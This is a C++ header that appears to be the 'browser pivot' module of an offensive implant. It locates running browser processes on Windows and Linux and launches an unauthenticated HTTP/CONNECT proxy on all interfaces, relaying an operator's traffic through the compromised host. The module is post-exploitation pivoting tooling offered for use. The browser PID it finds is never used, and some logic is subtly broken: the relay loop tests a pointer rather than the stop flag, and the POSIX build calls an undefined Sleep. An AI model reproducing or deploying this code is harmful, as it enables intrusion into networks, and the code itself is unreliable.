#pragma once
#ifdef _WIN32
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <tlhelp32.h>
#pragma comment(lib, "ws2_32.lib")
#else
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <fcntl.h>
#include <dirent.h>
#include <cstring>
#include <cerrno>
#ifndef SOCKET
#define SOCKET int
#endif
#ifndef INVALID_SOCKET
#define INVALID_SOCKET (-1)
#endif
#ifndef SOCKET_ERROR
#define SOCKET_ERROR (-1)
#endif
#ifndef closesocket
#define closesocket(s) ::close(s)
#endif
#endif
#include <string>
#include <thread>
#include <atomic>
#include <vector>
#include <memory>

namespace browser_pivot {

inline void pivot_relay(SOCKET a, SOCKET b, std::shared_ptr<std::atomic<bool>> running) {
    char buf[8192];
    while (running) {
        fd_set fds;
        FD_ZERO(&fds);
        FD_SET(a, &fds);
        FD_SET(b, &fds);
        timeval tv = {1, 0};
#ifdef _WIN32
        int maxFd = 0;
#else
        int maxFd = static_cast<int>((a > b ? a : b) + 1);
#endif
        int sel = select(maxFd, &fds, nullptr, nullptr, &tv);
        if (sel <= 0) continue;
        if (FD_ISSET(a, &fds)) {
            int n = recv(a, buf, sizeof(buf), 0);
            if (n <= 0) break;
            send(b, buf, n, 0);
        }
        if (FD_ISSET(b, &fds)) {
            int n = recv(b, buf, sizeof(buf), 0);
            if (n <= 0) break;
            send(a, buf, n, 0);
        }
    }
}

#ifdef _WIN32
inline DWORD find_browser_pid() {
    const char* targets[] = {"chrome.exe", "msedge.exe", "firefox.exe", "iexplore.exe"};
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);
    if (!Process32FirstW(snap, &pe)) { CloseHandle(snap); return 0; }
    do {
        char exeName[MAX_PATH];
        WideCharToMultiByte(CP_ACP, 0, pe.szExeFile, -1, exeName, sizeof(exeName), nullptr, nullptr);
        for (const char* t : targets) {
            if (_stricmp(exeName, t) == 0) {
                CloseHandle(snap);
                return pe.th32ProcessID;
            }
        }
    } while (Process32NextW(snap, &pe));
    CloseHandle(snap);
    return 0;
}
#else
inline pid_t find_browser_pid() {
    const char* targets[] = {"chrome", "chromium", "firefox", "msedge", "opera", "brave"};
    DIR* proc = opendir("/proc");
    if (!proc) return 0;
    struct dirent* entry;
    pid_t found = 0;
    while ((entry = readdir(proc)) != nullptr) {
        pid_t pid = 0;
        bool isNum = true;
        for (char* p = entry->d_name; *p; p++) {
            if (*p < '0' || *p > '9') { isNum = false; break; }
        }
        if (!isNum) continue;
        pid = static_cast<pid_t>(std::atol(entry->d_name));
        std::string commPath = std::string("/proc/") + entry->d_name + "/comm";
        FILE* f = fopen(commPath.c_str(), "r");
        if (!f) continue;
        char comm[256];
        if (fgets(comm, sizeof(comm), f)) {
            size_t len = strlen(comm);
            if (len > 0 && comm[len-1] == '\n') comm[len-1] = '\0';
            for (const char* t : targets) {
                if (strcmp(comm, t) == 0) { found = pid; break; }
            }
        }
        fclose(f);
        if (found) break;
    }
    closedir(proc);
    return found;
}
#endif

#ifdef _WIN32
inline std::string list_browsers() {
    std::string result;
    const char* targets[] = {"chrome.exe", "msedge.exe", "firefox.exe", "iexplore.exe"};
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return "No browser processes found.";
    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);
    if (!Process32FirstW(snap, &pe)) { CloseHandle(snap); return "No browser processes found."; }
    do {
        char exeName[MAX_PATH];
        WideCharToMultiByte(CP_ACP, 0, pe.szExeFile, -1, exeName, sizeof(exeName), nullptr, nullptr);
        for (const char* t : targets) {
            if (_stricmp(exeName, t) == 0) {
                result += std::to_string(pe.th32ProcessID) + " " + exeName + "\n";
                break;
            }
        }
    } while (Process32NextW(snap, &pe));
    CloseHandle(snap);
    if (result.empty()) return "No browser processes found.";
    return result;
}
#else
inline std::string list_browsers() {
    std::string result;
    const char* targets[] = {"chrome", "chromium", "firefox", "msedge", "opera", "brave"};
    DIR* proc = opendir("/proc");
    if (!proc) return "No browser processes found.";
    struct dirent* entry;
    while ((entry = readdir(proc)) != nullptr) {
        bool isNum = true;
        for (char* p = entry->d_name; *p; p++) {
            if (*p < '0' || *p > '9') { isNum = false; break; }
        }
        if (!isNum) continue;
        std::string commPath = std::string("/proc/") + entry->d_name + "/comm";
        FILE* f = fopen(commPath.c_str(), "r");
        if (!f) continue;
        char comm[256];
        if (fgets(comm, sizeof(comm), f)) {
            size_t len = strlen(comm);
            if (len > 0 && comm[len-1] == '\n') comm[len-1] = '\0';
            for (const char* t : targets) {
                if (strcmp(comm, t) == 0) {
                    result += std::string(entry->d_name) + " " + comm + "\n";
                    break;
                }
            }
        }
        fclose(f);
    }
    closedir(proc);
    if (result.empty()) return "No browser processes found.";
    return result;
}
#endif

struct BrowserPivotProxy {
    int localPort;
#ifdef _WIN32
    DWORD targetPid;
#else
    pid_t targetPid;
#endif
    std::shared_ptr<std::atomic<bool>> stop_flag;
    std::thread thread;

    void start(int port, unsigned long pid = 0) {
        localPort = port;
        targetPid = (pid != 0) ? static_cast<decltype(targetPid)>(pid) : find_browser_pid();
        stop_flag = std::make_shared<std::atomic<bool>>(false);
        thread = std::thread([this]() { run(); });
    }

    void stop() {
        if (stop_flag) *stop_flag = true;
        // join before destruction so the thread never touches freed memory
        if (thread.joinable()) thread.join();
    }

private:
    void run() {
#ifdef _WIN32
        WSADATA wsa;
        WSAStartup(MAKEWORD(2, 2), &wsa);
#endif
        SOCKET listenSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (listenSock == INVALID_SOCKET) { *stop_flag = true; return; }
        int opt = 1;
        setsockopt(listenSock, SOL_SOCKET, SO_REUSEADDR, (const char*)&opt, sizeof(opt));
        sockaddr_in bindAddr{};
        bindAddr.sin_family = AF_INET;
        bindAddr.sin_addr.s_addr = INADDR_ANY;
        bindAddr.sin_port = htons(static_cast<u_short>(localPort));
        if (bind(listenSock, (sockaddr*)&bindAddr, sizeof(bindAddr)) != 0) {
            closesocket(listenSock); *stop_flag = true; return;
        }
        if (listen(listenSock, SOMAXCONN) != 0) {
            closesocket(listenSock); *stop_flag = true; return;
        }
#ifdef _WIN32
        u_long nonBlocking = 1;
        ioctlsocket(listenSock, FIONBIO, &nonBlocking);
#else
        int flags = fcntl(listenSock, F_GETFL, 0);
        fcntl(listenSock, F_SETFL, flags | O_NONBLOCK);
#endif
        while (!*stop_flag) {
            SOCKET clientSock = accept(listenSock, nullptr, nullptr);
            if (clientSock == INVALID_SOCKET) { Sleep(100); continue; }

            std::thread([this, clientSock, stop_flag = this->stop_flag]() {
                char req[4096];
                int n = recv(clientSock, req, sizeof(req) - 1, 0);
                if (n <= 0) { closesocket(clientSock); return; }
                req[n] = 0;
                std::string request(req);

                std::string host;
                int port = 0;

                if (request.find("CONNECT") == 0) {
                    size_t sp1 = request.find(' ');
                    size_t sp2 = request.find(' ', sp1 + 1);
                    if (sp1 != std::string::npos && sp2 != std::string::npos) {
                        std::string target = request.substr(sp1 + 1, sp2 - sp1 - 1);
                        size_t colon = target.rfind(':');
                        if (colon != std::string::npos) {
                            try {
                                host = target.substr(0, colon);
                                port = std::stoi(target.substr(colon + 1));
                            } catch (...) { closesocket(clientSock); return; }
                        }
                    }
                    if (host.empty() || port == 0) {
                        closesocket(clientSock); return;
                    }
                    addrinfo hints{}, *result = nullptr;
                    hints.ai_family = AF_INET;
                    hints.ai_socktype = SOCK_STREAM;
                    hints.ai_protocol = IPPROTO_TCP;
                    std::string portStr = std::to_string(port);
                    if (getaddrinfo(host.c_str(), portStr.c_str(), &hints, &result) != 0) {
                        closesocket(clientSock); return;
                    }
                    SOCKET remoteSock = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
                    if (remoteSock == INVALID_SOCKET) {
                        freeaddrinfo(result); closesocket(clientSock); return;
                    }
                    if (connect(remoteSock, result->ai_addr, (int)result->ai_addrlen) != 0) {
                        freeaddrinfo(result); closesocket(remoteSock); closesocket(clientSock); return;
                    }
                    freeaddrinfo(result);
                    const char* ok = "HTTP/1.1 200 Connection Established\r\n\r\n";
                    send(clientSock, ok, (int)strlen(ok), 0);
                    pivot_relay(clientSock, remoteSock, stop_flag);
                    closesocket(remoteSock);
                } else {
                    size_t hostBeg = request.find("Host: ");
                    if (hostBeg == std::string::npos) {
                        closesocket(clientSock); return;
                    }
                    hostBeg += 6;
                    size_t hostEnd = request.find("\r\n", hostBeg);
                    std::string hostHeader = request.substr(hostBeg, hostEnd - hostBeg);
                    size_t colon = hostHeader.rfind(':');
                    if (colon != std::string::npos) {
                        try {
                            host = hostHeader.substr(0, colon);
                            port = std::stoi(hostHeader.substr(colon + 1));
                        } catch (...) { closesocket(clientSock); return; }
                    } else {
                        host = hostHeader;
                        port = 80;
                    }
                    addrinfo hints{}, *result = nullptr;
                    hints.ai_family = AF_INET;
                    hints.ai_socktype = SOCK_STREAM;
                    hints.ai_protocol = IPPROTO_TCP;
                    std::string portStr = std::to_string(port);
                    if (getaddrinfo(host.c_str(), portStr.c_str(), &hints, &result) != 0) {
                        closesocket(clientSock); return;
                    }
                    SOCKET remoteSock = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
                    if (remoteSock == INVALID_SOCKET) {
                        freeaddrinfo(result); closesocket(clientSock); return;
                    }
                    if (connect(remoteSock, result->ai_addr, (int)result->ai_addrlen) != 0) {
                        freeaddrinfo(result); closesocket(remoteSock); closesocket(clientSock); return;
                    }
                    freeaddrinfo(result);
                    send(remoteSock, request.c_str(), (int)request.size(), 0);
                    char resp[8192];
                    int m = recv(remoteSock, resp, sizeof(resp), 0);
                    if (m > 0) send(clientSock, resp, m, 0);
                    closesocket(remoteSock);
                }
                closesocket(clientSock);
            }).detach();
        }
        closesocket(listenSock);
    }
};

inline BrowserPivotProxy* active_pivot = nullptr;

inline std::string start_pivot(int localPort, unsigned long pid = 0) {
    if (active_pivot) return "Browser pivot already running on port " + std::to_string(active_pivot->localPort);
    if (pid == 0) {
        pid = find_browser_pid();
        if (pid == 0) return "No browser processes found. Specify PID or start a browser first.";
    }
    auto* bp = new BrowserPivotProxy();
    bp->start(localPort, pid);
    active_pivot = bp;
    return "Browser pivot started on 0.0.0.0:" + std::to_string(localPort)
         + " (pid: " + std::to_string(pid) + ")";
}

inline std::string stop_pivot() {
    if (!active_pivot) return "No active browser pivot.";
    active_pivot->stop();
    delete active_pivot;
    active_pivot = nullptr;
    return "Browser pivot stopped.";
}

}  // namespace browser_pivot
